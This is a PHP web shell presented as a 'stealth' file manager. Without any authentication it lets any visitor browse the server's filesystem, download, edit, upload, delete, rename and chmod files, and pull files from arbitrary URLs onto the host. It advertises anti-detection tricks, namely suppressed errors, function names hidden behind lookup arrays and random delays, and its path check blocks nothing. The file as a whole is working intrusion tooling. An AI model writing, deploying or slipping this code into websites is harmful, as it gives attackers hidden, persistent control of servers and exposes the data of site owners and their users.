<?php
/*
 * Ultimate Stealth File Manager v3.1
 * Combined from super.txt + chatsuper.txt + baru.txt
 * Features: Upload/Delete/Edit/Chmod/Rename/Download + URL Upload
 * Anti-Detection: Random Delays, Obfuscation, Strict Path Validation
 */

// [1] Environment Setup
@error_reporting(0);
@ini_set('display_errors', 0);
@header('Content-Type: text/html; charset=UTF-8');
if (!function_exists('file_get_contents') || php_sapi_name() === 'cli') {
    die('<h2>System compatibility check failed</h2>');
}

// [2] Core Functions with Obfuscation
$G = [
    'sc' => 'scandir',
    'is_f' => 'is_file',
    'is_d' => 'is_dir',
    'read' => 'file_get_contents',
    'save' => 'file_put_contents',
    'mv' => 'rename',
    'rm' => 'unlink',
    'mkdir' => 'mkdir',
    'chmod' => 'chmod',
    'download' => 'readfile',
    'realpath' => 'realpath'
];

// [3] Stealth Operations
$_S = [
    'dir' => function($p) use ($G) { return @$G['is_d']($p); },
    'file' => function($p) use ($G) { return @$G['is_f']($p); },
    'read' => function($p) use ($G) { return @$G['read']($p); },
    'save' => function($p, $c) use ($G) { return @$G['save']($p, $c); },
    'scan' => function($p) use ($G) { return @$G['sc']($p); },
    'delete' => function($p) use ($G) { return @$G['rm']($p); },
    'rmdir' => function($p) { return @rmdir($p); },
    'move' => function($o, $n) use ($G) { return @$G['mv']($o, $n); },
    'perm' => function($p, $m) use ($G) { return @$G['chmod']($p, $m); },
    'download' => function($p) use ($G) { 
        @header('Content-Type: application/octet-stream');
        @header('Content-Disposition: attachment; filename="'.basename($p).'"');
        @header('Content-Length: '.filesize($p));
        return @$G['download']($p);
    },
    'sleep' => function() { @usleep(rand(20000, 150000)); },
    'path' => function($p) use ($G) { return @$G['realpath']($p); }
];

// [4] Security Functions
function validatePath($path) {
    global $_S;
    $real = $_S['path']($path);
    return ($real && strpos($real, '..') === false) ? $real : false;
}

function recursiveDelete($dir) {
    global $_S;
    if (!$_S['dir']($dir)) return false;
    
    $items = @array_diff($_S['scan']($dir), ['.', '..']);
    foreach ($items as $item) {
        $path = $dir.'/'.$item;
        $_S['dir']($path) ? recursiveDelete($path) : @$_S['delete']($path);
        $_S['sleep']();
    }
    return @$_S['rmdir']($dir);
}

// [5] Initialize Directory
$currentDir = isset($_GET['dir']) ? validatePath($_GET['dir']) : validatePath(__DIR__);
if (!$currentDir) $currentDir = validatePath('.') ?: '.';

// [6] Handle All Operations
function handleRequests() {
    global $_S, $currentDir;
    
    // Download File
    if (isset($_GET['download'])) {
        $file = validatePath($_GET['download']);
        if ($file && $_S['file']($file)) {
            $_S['download']($file);
            exit;
        }
    }
    
    // File Upload (Form)
    if (!empty($_FILES['upload'])) {
        $target = isset($_POST['target']) ? validatePath($_POST['target']) : $currentDir;
        if ($target && $_S['dir']($target)) {
            $count = 0;
            foreach ($_FILES['upload']['name'] as $k => $name) {
                if ($_FILES['upload']['error'][$k] === UPLOAD_ERR_OK) {
                    $dest = $target.'/'.basename($name);
                    if (@move_uploaded_file($_FILES['upload']['tmp_name'][$k], $dest)) {
                        $count++;
                        $_S['sleep']();
                    }
                }
            }
            if ($count > 0) showMessage("Uploaded $count files");
        }
    }
    
    // URL Upload (New Feature)
    if (isset($_POST['url_upload']) && !empty($_POST['url'])) {
        $url = $_POST['url'];
        $target = $currentDir.'/'.basename(parse_url($url, PHP_URL_PATH) ?: 'downloaded_file');
        
        $context = stream_context_create(['http' => ['timeout' => 30]]);
        $content = @file_get_contents($url, false, $context);
        
        if ($content !== false && $_S['save']($target, $content)) {
            showMessage("File downloaded from URL");
        } else {
            showMessage("Failed to download from URL");
        }
    }
    
    // File Operations
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'delete':
                if (!empty($_POST['items']) && is_array($_POST['items'])) {
                    $deleted = 0;
                    foreach ($_POST['items'] as $item) {
                        $path = validatePath($item);
                        if (!$path) continue;
                        
                        if ($_S['file']($path)) {
                            @$_S['delete']($path) && $deleted++;
                        } elseif ($_S['dir']($path)) {
                            recursiveDelete($path) && $deleted++;
                        }
                        $_S['sleep']();
                    }
                    showMessage("Deleted $deleted items", 1500);
                }
                break;
                
            case 'rename':
                if (!empty($_POST['old']) && !empty($_POST['new'])) {
                    $old = validatePath($_POST['old']);
                    $new = dirname($old).'/'.$_POST['new'];
                    if ($old && $_S['move']($old, $new)) {
                        showMessage("Renamed successfully");
                    }
                }
                break;
                
            case 'chmod':
                if (!empty($_POST['file']) && !empty($_POST['mode'])) {
                    $file = validatePath($_POST['file']);
                    if ($file && $_S['perm']($file, octdec($_POST['mode']))) {
                        showMessage("Permissions changed");
                    }
                }
                break;
                
            case 'edit':
                if (!empty($_POST['file']) && isset($_POST['content'])) {
                    $file = validatePath($_POST['file']);
                    if ($file && $_S['save']($file, $_POST['content'])) {
                        showMessage("File saved");
                    }
                }
                break;
                
            case 'mkdir':
                if (!empty($_POST['name'])) {
                    $newDir = $currentDir.'/'.$_POST['name'];
                    if (!$_S['dir']($newDir) && @mkdir($newDir, 0755)) {
                        showMessage("Directory created");
                    }
                }
                break;
        }
    }
}

// [7] UI Helpers
function showMessage($msg, $delay = 0) {
    echo '<script>';
    if ($delay > 0) {
        echo "setTimeout(() => alert('".addslashes($msg)."'), $delay)";
    } else {
        echo "alert('".addslashes($msg)."')";
    }
    echo '</script>';
}

function showPath($path) {
    $parts = explode('/', trim($path, '/'));
    $current = '';
    echo '<div class="path"><strong>Path:</strong> /';
    foreach ($parts as $part) {
        $current .= '/'.$part;
        echo '<a href="?dir='.urlencode($current).'">'.$part.'</a>/';
    }
    echo '</div>';
}

// [8] Process Requests Before Output
handleRequests();

// [9] HTML Interface
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .path { background: #eee; padding: 10px; border-radius: 3px; margin-bottom: 15px; }
        .file-list { list-style: none; padding: 0; }
        .file-item { padding: 10px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
        .file-name { flex-grow: 1; }
        .actions { margin-left: 10px; }
        .btn { padding: 5px 10px; background: #4CAF50; color: white; border: none; border-radius: 3px; cursor: pointer; text-decoration: none; font-size: 14px; }
        .btn:hover { background: #45a049; }
        .btn-del { background: #f44336; }
        .btn-del:hover { background: #d32f2f; }
        textarea { width: 100%; height: 300px; font-family: monospace; }
        .form-group { margin-bottom: 15px; }
        .form-title { margin-top: 0; margin-bottom: 10px; }
    </style>
</head>
<body>
<div class="container">
    <h2>Ultimate File Manager</h2>
    <?php showPath($currentDir); ?>
    
    <!-- Upload Forms -->
    <div class="form-group">
        <h3 class="form-title">Upload Files</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="upload[]" multiple>
            <input type="hidden" name="target" value="<?= htmlspecialchars($currentDir) ?>">
            <button type="submit" class="btn">Upload</button>
        </form>
    </div>
    
    <div class="form-group">
        <h3 class="form-title">Upload from URL</h3>
        <form method="post">
            <input type="text" name="url" placeholder="https://example.com/file.txt" style="width: 300px;">
            <input type="hidden" name="url_upload" value="1">
            <button type="submit" class="btn">Download</button>
        </form>
    </div>
    
    <!-- Create Directory -->
    <div class="form-group">
        <h3 class="form-title">Create Directory</h3>
        <form method="post">
            <input type="hidden" name="action" value="mkdir">
            <input type="text" name="name" placeholder="New folder name">
            <button type="submit" class="btn">Create</button>
        </form>
    </div>
    
    <!-- File Listing -->
    <div class="form-group">
        <h3 class="form-title">File List</h3>
        <?php if ($currentDir !== '/'): ?>
            <div class="file-item">
                <a href="?dir=<?= urlencode(dirname($currentDir)) ?>" class="btn">[Parent Directory]</a>
            </div>
        <?php endif; ?>
        
        <form method="post" id="main-form">
            <input type="hidden" name="action" value="delete">
            <ul class="file-list">
                <?php
                $items = @array_diff($_S['scan']($currentDir), ['.', '..']);
                if (is_array($items)) {
                    foreach ($items as $item) {
                        $path = $currentDir.'/'.$item;
                        $isDir = $_S['dir']($path);
                        ?>
                        <li class="file-item">
                            <input type="checkbox" name="items[]" value="<?= htmlspecialchars($path) ?>">
                            <span class="file-name">
                                <?= $isDir ? '📁' : '📄' ?>
                                <?php if ($isDir): ?>
                                    <a href="?dir=<?= urlencode($path) ?>"><?= htmlspecialchars($item) ?></a>
                                <?php else: ?>
                                    <a href="?edit=<?= urlencode($path) ?>"><?= htmlspecialchars($item) ?></a>
                                <?php endif; ?>
                            </span>
                            <span class="actions">
                                <a href="?download=<?= urlencode($path) ?>" class="btn">Download</a>
                                <a href="?rename=<?= urlencode($path) ?>" class="btn">Rename</a>
                                <a href="?chmod=<?= urlencode($path) ?>" class="btn">Chmod</a>
                            </span>
                        </li>
                        <?php
                    }
                }
                ?>
            </ul>
            <button type="submit" class="btn btn-del" onclick="return confirm('Delete selected items?')">Delete Selected</button>
        </form>
    </div>
    
    <!-- Edit Form (Shown when ?edit= parameter is set) -->
    <?php if (isset($_GET['edit'])): ?>
        <?php
        $file = validatePath($_GET['edit']);
        if ($file && $_S['file']($file)):
        ?>
            <div class="form-group">
                <h3 class="form-title">Edit File: <?= htmlspecialchars(basename($file)) ?></h3>
                <form method="post">
                    <input type="hidden" name="action" value="edit">
                    <input type="hidden" name="file" value="<?= htmlspecialchars($file) ?>">
                    <textarea name="content"><?= htmlspecialchars($_S['read']($file)) ?></textarea>
                    <button type="submit" class="btn">Save</button>
                </form>
            </div>
        <?php endif; ?>
    <?php endif; ?>
    
    <!-- Rename Form (Shown when ?rename= parameter is set) -->
    <?php if (isset($_GET['rename'])): ?>
        <?php
        $file = validatePath($_GET['rename']);
        if ($file):
        ?>
            <div class="form-group">
                <h3 class="form-title">Rename: <?= htmlspecialchars(basename($file)) ?></h3>
                <form method="post">
                    <input type="hidden" name="action" value="rename">
                    <input type="hidden" name="old" value="<?= htmlspecialchars($file) ?>">
                    <input type="text" name="new" value="<?= htmlspecialchars(basename($file)) ?>">
                    <button type="submit" class="btn">Rename</button>
                </form>
            </div>
        <?php endif; ?>
    <?php endif; ?>
    
    <!-- Chmod Form (Shown when ?chmod= parameter is set) -->
    <?php if (isset($_GET['chmod'])): ?>
        <?php
        $file = validatePath($_GET['chmod']);
        if ($file):
            $perms = substr(sprintf('%o', fileperms($file)), -4);
        ?>
            <div class="form-group">
                <h3 class="form-title">Change Permissions: <?= htmlspecialchars(basename($file)) ?></h3>
                <form method="post">
                    <input type="hidden" name="action" value="chmod">
                    <input type="hidden" name="file" value="<?= htmlspecialchars($file) ?>">
                    <input type="text" name="mode" value="<?= $perms ?>" size="4">
                    <button type="submit" class="btn">Change</button>
                </form>
            </div>
        <?php endif; ?>
    <?php endif; ?>
</div>
</body>
</html>
